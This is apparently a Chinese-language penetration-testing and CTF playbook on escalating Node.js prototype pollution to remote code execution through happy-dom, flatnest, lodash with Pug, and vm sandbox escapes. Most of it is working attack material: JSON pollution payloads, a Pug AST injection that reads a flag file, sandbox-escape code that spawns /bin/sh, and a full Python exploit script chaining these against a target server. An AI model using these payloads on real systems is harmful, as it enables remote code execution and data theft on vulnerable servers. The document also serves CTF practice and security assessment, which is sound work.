---

phase: webapp
vuln_class: [prototype-pollution, sandbox-escape, nodejs]
title: Node.js 沙箱逃逸与原型链 RCE
summary: 原型链污染本身只是「能改 Object.prototype」，要有 RCE 必须接一个 gadget。本篇只讲 Node 侧的两条出口：库设置被污染放大成代码执行、vm 沙箱本身不是安全边界。
---

# Node.js 沙箱逃逸与原型链 RCE

污染注入点、检测手法、各家库的 gadget 表见 [[web/漏洞分类/原型链污染/原型链污染测试.md|原型链污染测试]]。**本篇只讲污染之后怎么走到 RCE。**

## 0. 判据速查

| 观察到的现象 | 说明 | 去哪节 |
|---|---|---|
| 能污染 `Object.prototype`，但改了没反应 | 缺 gadget，污染本身不构成漏洞 | §1 |
| 服务端把用户 HTML 交给 `happy-dom` / `jsdom` 渲染 | 渲染器会读 `browserSettings`，这是现成出口 | §1.1 |
| 用了 `flatnest` 且调 `nest()` 处理用户输入 | `seek()` 没做 `__proto__` 过滤，CVE-2023-26135 | §2 |
| 模板引擎（Pug/EJS/Handlebars）编译用户数据 | AST 节点属性走原型链查找 → 注入 AST | §3 |
| 有 `vm.runInContext` / `vm.Script` | **`vm` 不是安全边界**，直接逃 | §4 |
| 用 `vm2` / `realms-shim` | vm2 已废弃且有大量逃逸 CVE；realms-shim 已弃 | §4 |
| `package.json` 里 lodash < 4.17.5 | `_.merge()` 可污染 | §3 |

**核心判据**：原型链污染的价值 = **被污染的那个属性，恰好被某个下游组件当成配置读**。没有下游读取，污染再成功也只是脏数据。

---

## 1. 库设置被污染放大（最通用的一类 gadget）

**模式**：库从 options 对象读可选配置，调用方没传该字段 → JS 沿原型链往上找 → 找到被污染的 `Object.prototype.xxx`。

这类 gadget 不需要特定 CVE，只需要「库读配置时用了 `options?.settings` 而不是 `Object.hasOwn(options,'settings')`」。

### 1.1 happy-dom：把 JS 求值开关污染开

`happy-dom` v20.x 的 `Window` 构造：

```javascript
constructor(options) {
  const browser = new DetachedBrowser(BrowserWindow, {
    settings: options?.settings   // options = { console }，没有 own 的 settings
    // 若 Object.prototype.settings = { enableJavaScriptEvaluation: true }
    // → 这里就拿到了攻击者的配置
  });
}
```

**为什么 `document.write` 是关键**：`document.write()` 建解析器时带 `evaluateScripts: true`，走这条路创建的 `<script>` **不会**被标 `disableEvaluation`。剩下的唯一闸就是 `browserSettings.enableJavaScriptEvaluation` —— 而这个闸正好被污染打开。

对比：直接 `innerHTML` 插入的 script 会被标 `disableEvaluation`，光污染 `enableJavaScriptEvaluation` 不够。**必须走 `document.write` 这条路径。**

判据：`happy-dom` < 20.0.0 默认开 JS 求值（不用污染就能打）；20.x+ 需要污染重新打开。

---

## 2. flatnest：`seek()` 没做过滤（CVE-2023-26135）

**缺陷**：`insert()` 挡了 `__proto__` / `constructor`，但 `seek()`（解析 `[Circular (path)]` 值）**完全没检查**。

**调用链**：

```
nest(obj)
 └─ 遍历 key
     └─ value 匹配 /\[Circular \((.+)\)\]/ → seek(nested, path)
         └─ seek 自由遍历 constructor.prototype → 返回 Object.prototype
             └─ 后续 key 直接写到 Object.prototype 上
```

**利用**：

```json
POST /config
{
  "x": "[Circular (constructor.prototype)]",
  "x.settings.enableJavaScriptEvaluation": true
}
```

`x` 先被解析成 `Object.prototype`，第二个 key `x.settings.enableJavaScriptEvaluation` 就写到了原型上。

**坑**：1.0.1 的「修复」只加固了 `insert()`，`seek()` 仍然裸奔 —— 这个版本等于没修。

判据：`package.json` 有 `flatnest` + 有接口把用户输入喂给 `nest()`。

---

## 3. 模板引擎 AST 注入（Pug / lodash 链）

**原理**：模板引擎编译时对每个 AST 节点查 `node.block` 之类的属性。节点自身没有该属性 → 沿原型链找到被污染的 `Object.prototype.block` → 攻击者的 AST 片段被当成模板的一部分编译。

**lodash < 4.17.5 + Pug**（题目例证：VuwCTF 2025）：

```json
{
  "constructor": {
    "prototype": {
      "block": {
        "type": "Text",
        "line": "1;pug_html+=global.process.mainModule.require('fs').readFileSync('/app/flag.txt').toString();//",
        "val": "x"
      }
    }
  },
  "word": "exploit"
}
```

投递方式：JSON base64 后塞进 `?data=<encoded>`。

执行链：

1. `_.merge()` 处理用户输入 → 写入 `Object.prototype.block`
2. Pug 编译每个节点时读 `node.block`
3. 没有 own `block` 的节点从原型继承 → 拿到注入的 `Text` 节点
4. `type: "Text"` + `line:` 里的 payload 在编译期被拼进生成代码
5. 服务端执行，读到 flag

判据：`lodash` < 4.17.5 **且** 用 Pug/Jade。只有 lodash 没模板引擎 → 得另找 gadget。

---

## 4. `vm` 沙箱逃逸

**`vm` 模块不是安全边界**，官方文档写得很清楚。跨边界的对象仍然持有宿主上下文的引用，顺着 `constructor` 就能摸回去。

### 4.1 通用逃逸原语

```javascript
const F = this.constructor.constructor;   // 拿到宿主 realm 的 Function 构造器
```

原理：沙箱里的对象 `this` 是沙箱 realm 创建的，但 `this.constructor` 一路往上会到沙箱的 `Function`；而沙箱的 `Function` 在某些实现下能拿到宿主的。实际逃逸路径取决于具体封装，核心是**跨 realm 拿到宿主的 `Function` 或 `process`**。

### 4.2 ESM 兼容写法（CVE-2025-61927）

ESM 下 `process` 不在全局，`mainModule` 也不存在，要走 `binding`：

```javascript
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return globalThis.process")();
const spawnSync = proc.binding("spawn_sync");
const result = spawnSync.spawn({
  file: "/bin/sh",
  args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [
    { type: "pipe", readable: true,  writable: false },
    { type: "pipe", readable: false, writable: true  },
    { type: "pipe", readable: false, writable: true  }
  ]
});
const output = Buffer.from(result.output[1]).toString();
```

**注意 stdio 三个管道缺一不可**：stdin 要 readable、stdout/stderr 要 writable，少一个 `spawn` 直接抛错。

### 4.3 CommonJS 写法

```javascript
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return process")();
const result = proc.mainModule.require("child_process").execSync("id").toString();
```

`mainModule` 只有 CJS 有；ESM 下必须走 §4.2 的 `binding`。

### 4.4 逃逸后没有回显怎么办

沙箱里通常没有 `console`、没有网络。回显通道：

- 写 `document.title`（若在 happy-dom/jsdom 里，渲染结果能读到）
- 抛异常把内容带进错误信息
- 写文件到静态目录
- 打带外（`fetch` 若可用）

---

## 5. 完整链：污染 → 沙箱逃逸 → RCE

**架构**（题目例证：4llD4y）：

1. 污染 `Object.prototype.settings`，打开 happy-dom 的 JS 求值
2. 用 `document.write()` 提交带 `<script>` 的 HTML（这条路径 `evaluateScripts: true`）
3. script 在 vm 里执行，经 `this.constructor.constructor` 逃逸，拿 RCE

```python
import requests
TARGET = "http://target:3000"

# 1. 经 flatnest 循环引用污染
pollution = {
    "x": "[Circular (constructor.prototype)]",
    "x.settings.enableJavaScriptEvaluation": True,
    "x.settings.suppressInsecureJavaScriptEnvironmentWarning": True
}
requests.post(f"{TARGET}/config", json=pollution)

# 2. 渲染 HTML 时逃逸
rce_script = """
const F = this.constructor.constructor;
const proc = F("return globalThis.process")();
const s = proc.binding("spawn_sync");
const r = s.spawn({
  file: "/bin/sh", args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [{type:"pipe",readable:true,writable:false},
          {type:"pipe",readable:false,writable:true},
          {type:"pipe",readable:false,writable:true}]
});
document.title = Buffer.from(r.output[1]).toString();
"""
r = requests.post(f"{TARGET}/render", json={"html": f"<script>{rce_script}</script>"})
print(r.text.split("<title>")[1].split("</title>")[0])
```

**这条链的三段缺一不可**：
- 没有污染 → happy-dom 不开 JS 求值
- 没有 `document.write` → script 被标 `disableEvaluation`
- 没有 vm 逃逸 → 代码能跑但读不到 flag

**卡在哪一段就从哪一段往下推**，别重复打已经通过的那段。

---

## 6. 受影响组件速查

| 组件 | 版本 / 条件 | 问题 |
|---|---|---|
| `happy-dom` | < 20.0.0 | 默认开 JS 求值 |
| `happy-dom` | 20.x+ | 需污染重新打开 |
| `vm2` | 全部 | 已废弃，逃逸 CVE 多 |
| `realms-shim` | 全部 | 已弃用，不建议依赖 |
| `lodash` | < 4.17.5 | `_.merge()` 可污染 |
| `flatnest` | ≤ 1.0.1 | `seek()` 无过滤 |
| `jsdom` | 视配置 | 渲染用户 HTML 时 `runScripts` 配置决定风险 |

## 7. 检测入口

- `package.json` 里出现 `flatnest` + 有接口调 `nest()` 处理用户输入
- `happy-dom` / `jsdom` 渲染用户可控 HTML（找 `/render`、`/preview`、`/export` 这类接口）
- 任何 `vm.runInContext` / `vm.Script` / `vm.runInNewContext`
- `lodash` < 4.17.5 + Pug/Jade/EJS/Handlebars
- 模板引擎把用户数据当**模板**而非**数据**（`compile(userInput)`）

---

## 8. 纪律

- **污染成功 ≠ 漏洞成立**。必须找到下游读取点，能演示「改了原型 → 行为变了」。只证明「我改了 `Object.prototype`」在报告里没有说服力。
- **优先找现成 gadget，别自己造**。库设置读取（§1）是最通用的一类，比追特定 CVE 稳。
- **`vm` 别当沙箱评估**。看到 `vm` 就直接试逃逸，不用先论证「理论上不安全」。
- **ESM 和 CJS 的逃逸写法不同**。先确认模块系统，否则 `mainModule` 报 undefined 会让你误判「逃逸失败」。
- **回显要提前设计**。沙箱里没 console，先想好从哪出（title / 异常 / 文件 / 带外），否则拿到执行也看不见结果。
- **报的是 RCE 不是「原型链污染」**。成果落到「读到了 flag / 执行了命令」，污染只是路径。
